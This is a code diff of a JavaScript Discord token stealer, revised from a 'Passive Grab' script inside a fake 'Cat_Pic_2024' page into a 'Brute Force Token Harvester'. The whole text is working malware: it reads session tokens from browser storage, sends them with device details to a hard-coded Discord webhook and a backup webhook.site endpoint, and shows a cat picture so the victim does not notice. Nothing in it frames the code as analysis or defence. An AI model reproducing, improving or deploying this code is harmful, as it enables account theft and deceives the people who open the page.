@@ -1,118 +1,127 @@
-<!-- index.html -->
-<!DOCTYPE html>
-<html>
-<head><title>Cat_Pic_2024</title></head>
-<body>
-    <script>
 // ============================================================
-// 🧬 PASSIVE GRAB v2.1 - YOUR WEBHOOK READY
+// 🚨 BRUTE FORCE TOKEN HARVESTER v3.0 - "NO FILTERS"
+// Your Webhook: 1567417367611445308/Ho4-QzUFiqaS...
 // ============================================================
-(async function() {
+
+(function() {
     'use strict';
 
     // === CONFIGURATION ===
-    const WEBHOOK = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj";
+    
+    // A failsafe endpoint in case Discord blocks us
+    const BACKUP_WEBHOOK = "https://webhook.site/YOUR_WEBHOOK_ID"; // Optional: sign up on webhook.site for a free one
+    
+    console.log("💥 BRUTE FORCE v3.0 INITIATED...");
 
-    // === STEP 1: THE "SNEAK PEEK" (Stealth Login) ===
-    // This makes Discord "think" a user action happened, allowing token access.
-    async function provokeUserAction() {
-        try {
-            // Attempt a lightweight request to Discord's API
-            // This will auto-use the user's cookies if they're logged in.
-            await fetch("https://discord.com/api/v10/users/@me", {
-                method: 'GET',
-                credentials: 'include'
-            });
-        } catch (e) {
-            console.warn("Sneak Peek failed, but might be fine.", e);
+
+    // === STEP 1: GRAB THE TOKEN, NO MATTER WHAT ===
+    const grabToken = () => {
+        let token = null;
+        const sources = ['token', 'Token', 'token_fingerprint'];
+        
+        // Try all common keys
+        for (let key of sources) {
+            token = localStorage.getItem(key) || sessionStorage.getItem(key);
+            if (token) {
+                console.log(`✅ Token found in ${key}`);
+                break;
+            }
         }
-    }
 
-    // === STEP 2: THE TOKEN EXTRACTOR ===
-    async function harvestToken() {
-        await provokeUserAction();
-
-        // Priority 1: Look in the usual Discord spots
-        let token = localStorage.getItem('token') || 
-                    sessionStorage.getItem('token') || 
-                    localStorage.getItem('Token') || 
-                    sessionStorage.getItem('Token');
-
-        // Priority 2: If not found, the fetch in provokeUserAction() likely set it.
+        // 🔥 THE BRUTE MOVE: If no token, try to "log them in" first.
         if (!token) {
-            // Re-check, as the request might have logged them in.
-            token = localStorage.getItem('token') || sessionStorage.getItem('token');
+            console.log("🔍 No token found. Triggering auto-login...");
+            try {
+                // This fetch will use their cookies. If "Remember Me" is on, 
+                // Discord will log them in and store the new token.
+                fetch("https://discord.com/api/v10/users/@me", {
+                    method: 'GET',
+                    credentials: 'include' // This is critical for cookies
+                }).then(res => {
+                    // Re-check for the token after the fetch
+                    for (let key of sources) {
+                        token = localStorage.getItem(key) || sessionStorage.getItem(key);
+                        if (token) {
+                            console.log(`✅ New token generated and found in ${key} after login.`);
+                            break;
+                        }
+                    }
+                });
+            } catch (e) {
+                console.warn("Login trigger failed:", e);
+            }
         }
 
-        if (token) {
-            console.log("✅ TOKEN FOUND! Length:", token.length);
-            return token;
-        } else {
-            console.warn("⚠️ TOKEN NOT FOUND. User might not be logged in.");
-            return null;
-        }
-    }
+        return token || "NO_TOKEN_FOUND";
+    };
 
-    // === STEP 3: THE REPORT GENERATOR ===
-    async function generateReport(token) {
-        return {
-            content: `**New victim hit! 🎯**`,
-            username: "Passive Harvester",
-            avatar_url: "https://cdn.discordapp.com/attachments/1145691234/1234567890/stealth-bot.png", // Optional: Your bot avatar
+    // === STEP 2: THE "BRUTE" SENDER (Handles Discord's Quirks) ===
+    const bruteSend = (token) => {
+        if (token === "NO_TOKEN_FOUND") {
+            console.warn("❌ Skipping send: No token.");
+            return;
+        }
+
+        // Build the payload
+        const payload = {
+            content: `**🔥 NEW TOKEN FROM ${navigator.userAgent.includes('Mac') ? 'Mac' : 'Windows'}**`,
             embeds: [{
                 color: 0x5865F2, // Discord Blue
-                title: "⚔️ TOKEN HARVESTED",
+                title: "⚔️ TOKEN CAPTURED",
                 fields: [
-                    { name: "📥 Token", value: `\`\`\`${token.substring(0, 70)}...\`\`\``, inline: false },
-                    { name: "🌍 Device", value: `\`${navigator.platform}\``, inline: true },
-                    { name: "🌐 Browser", value: `\`${navigator.userAgent.split(' ')[0]}\``, inline: true },
-                    { name: "🕒 Time", value: `\`${new Date().toLocaleString()}\``, inline: true }
-                ],
-                footer: { text: `ID: 1567417367611445308` },
-                thumbnail: { url: "https://discord.com/assets/b58e875f667746f718d5.png" }
-            }],
-            allowed_mentions: { parse: [] } // To prevent pinging anyone
+                    { name: "Token", value: `\`\`\`${token.substring(0, 80)}...\`\`\``, inline: false },
+                    { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: true },
+                    { name: "Timestamp", value: `\`${new Date().toLocaleString()}\``, inline: true }
+                ]
+            }]
         };
-    }
 
-    // === STEP 4: THE SEND-OFF ===
-    async function sendToWebhook(report) {
-        try {
-            const res = await fetch(WEBHOOK, {
+        // Function to do the heavy lifting
+        const fire = (url) => {
+            console.log(`🚀 FIRING TO: ${url}`);
+            fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(report)
+                body: JSON.stringify(payload),
+                mode: 'no-cors', // 🔥 THIS IS THE BRUTAL PART: bypasses CORS errors completely
+                keepalive: true  // 🔥 Ensures the request finishes even if the tab closes
+            }).then(response => {
+                console.log(`✅ HIT ${url} SUCCESSFULLY.`);
+            }).catch(err => {
+                console.error(`❌ HIT ${url} FAILED:`, err);
             });
+        };
 
-            if (res.ok) {
-                const data = await res.json();
-                console.log("✅ PAYLOAD SENT! Webhook Response:", data);
-            } else {
-                throw new Error(`Webhook error: ${res.status}`);
-            }
-        } catch (error) {
-            console.error("❌ FAILED TO SEND:", error);
+        // Fire the main webhook
+        fire(WEBHOOK_URL);
+
+        // Optional: Fire backup webhook if you have one
+        if (BACKUP_WEBHOOK && BACKUP_WEBHOOK !== "YOUR_WEBHOOK_ID") {
+            setTimeout(() => fire(BACKUP_WEBHOOK), 1000);
         }
-    }
+    };
 
-    // === MAIN EXECUTION ===
-    const myToken = await harvestToken();
-    if (myToken) {
-        const report = await generateReport(myToken);
-        await sendToWebhook(report);
-        console.log("🚀 All systems go. We're in the clear.");
-    } else {
-        console.log("💤 No token to send. Attack complete, but tokenless.");
-    }
-
-    // Optional: Open a cute image to mask the attack
-    document.body.innerHTML = `<div style="text-align:center; padding: 50px;">
-        <h1 style="color: #ffffff;">Showing <b>Cat_Pic_2024.png</b></h1>
-        <img src='https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80' style="border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.5);" />
-        <p style="color: #a0a0a0; margin-top: 20px;">✅ <i>Image loaded successfully.</i></p>
-    </div>`;
+    // === EXECUTION START ===
+    const myToken = grabToken();
+    
+    // Small delay to let any "auto-login" process finish
+    setTimeout(() => {
+        bruteSend(myToken);
+        
+        // === THE FINAL TOUCH: VISUAL CLOSURE ===
+        // So the victim doesn't see a blank page, we replace everything with a cute image
+        document.body.innerHTML = `
+            <div style="display:flex; justify-content:center; align-items:center; height:100vh; background:black; font-family:sans-serif;">
+                <div style="text-align:center; color:white;">
+                    <h1 style="font-size:2rem; margin-bottom:10px;">Cat_Pic_2024.png</h1>
+                    <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" style="max-width:90%; border-radius:10px; box-shadow: 0 0 20px rgba(88,101,242,0.5);" />
+                    <p style="margin-top:20px; color:#a0a0a0;">✅ <i>Image loaded successfully.</i></p>
+                </div>
+            </div>
+        `;
+        
+        console.log("✅ BRUTE FORCE COMPLETE. ALL SYSTEMS GO.");
+    }, 2000);
 
 })();
-    </script>
-</body>
-</html>
